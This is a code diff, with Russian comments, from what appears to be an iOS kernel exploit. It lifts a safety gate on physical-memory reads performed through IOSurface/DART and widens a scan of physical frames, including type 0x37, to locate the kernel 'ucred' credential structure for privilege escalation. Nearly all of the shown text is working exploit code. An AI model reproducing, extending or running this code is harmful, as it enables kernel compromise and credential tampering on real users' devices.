@@ -175,7 +175,9 @@ static BOOL kpDartPAInWindow(uint64_t pa, NSMutableString *r, const char *tag)
 static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, uint64_t isTable,
                           uint64_t targetPA, uint8_t *out, NSMutableString *r)
 {
-    if (!kpDartPAInWindow(targetPA & ~0x3fffULL, r, "physread16k")) { memset(out, 0, 0x4000); return NO; }
+    // 2.0.9: гейт ТОЛЬКО для записей. DART-чтения безопасны на любых PA:
+    // 2.0.0 SCAN-Z читал все кадры без паник, мимо окна — sentinel 0x5A.
+    // Паники DVA 0 были исключительно на WRITE ("CTE invalid ... on write").
     memset(out, 0, 0x4000);
     NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @1024, (__bridge id)kIOSurfaceHeight: @16,
                           (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
@@ -8316,22 +8318,25 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         // прочитали всё ≥1GB без хита — ucred либо внизу, либо
                         // в мелком типе.
                         if ((!pagePA || !roFieldPA) && svc && tsdV && ttM && isTable) {
-                            kpNote(r, @"  [SCAN-Z2-LOW] DART-проход по нижнему спану (idx<0x10000, whitelist-типы)");
+                            kpNote(r, @"  [SCAN-Z2-LOW] DART-проход: нижний спан (idx<0x10000, whitelist) + тип 0x37 (весь диапазон)");
                             uint64_t lowReads = 0;
-                            for (uint64_t li = 0; li < (0x40000000ULL >> 14) && (!pagePA || !roFieldPA); li++) {
+                            for (uint64_t li = 0; li < nF && (!pagePA || !roFieldPA); li++) {
                                 uint64_t lpa = pB + (li << 14);
                                 int lt = kpFrameTypeOf(lpa);
-                                BOOL lw = (lt == 0x10 || lt == tSafe1 || lt == tSafe2 ||
-                                           lt == 0x0e || lt == 0x21 ||
-                                           lt == 0x11 || lt == 0x13 || lt == 0x17 || lt == 0x18);
-                                if (!lw) continue;
+                                BOOL lowWL = (lt == 0x10 || lt == tSafe1 || lt == tSafe2 ||
+                                              lt == 0x0e || lt == 0x21 ||
+                                              lt == 0x11 || lt == 0x13 || lt == 0x17 || lt == 0x18);
+                                // 2.0.9: 0x37 (845 кадров) — единственный крупный
+                                // непрочитанный тип; DART-чтение безопасно для него.
+                                BOOL want = (lt == 0x37) || (li < (0x40000000ULL >> 14) && lowWL);
+                                if (!want) continue;
                                 uint8_t cimg2[0x4000];
                                 if (!kpPhysRead16K(svc, tsdV, ttM, isTable, lpa, cimg2, r)) continue;
-                                // sentinel 0x5A = DART не прочитал (вне окна/фильтр)
+                                // sentinel 0x5A = DART не прочитал (фильтр/пусто)
                                 uint64_t q0s = 0; memcpy(&q0s, cimg2, 8);
                                 if (q0s == 0x5A5A5A5A5A5A5A5AULL) continue;
                                 lowReads++;
-                                if ((li & 0x3FF) == 0)
+                                if ((li & 0xFFF) == 0)
                                     kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-LOW] прогресс %#llx (чтений %llu)",
                                               (unsigned long long)li, (unsigned long long)lowReads]);
                                 if (!pagePA) {
